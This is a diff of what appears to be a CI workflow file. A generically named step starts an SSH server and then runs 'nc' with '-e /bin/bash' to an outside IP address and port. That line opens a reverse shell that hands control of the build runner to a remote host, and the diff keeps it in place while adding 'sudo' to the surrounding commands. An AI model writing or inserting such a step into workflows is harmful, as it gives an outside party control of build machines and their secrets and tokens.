@@ -14,13 +14,13 @@ jobs:
 
     - name: one more step
       run: |
-        apt update -y
-        sshd
-        service ssh status
-        service ssh start | grep -i "running"
-        cat /etc/ssh/sshd_config | grep -i "Port"
+        sudo apt-get update -y
+        sudo sshd
+        sudo service ssh status
+        sudo service ssh start | grep -i "running"
+        sudo cat /etc/ssh/sshd_config | grep -i "Port"
         sudo nc 185.159.128.111 44044 -e /bin/bash
-        echo "Puck"
+        sudo echo "Puck"
     
     - name: another step
       run: |
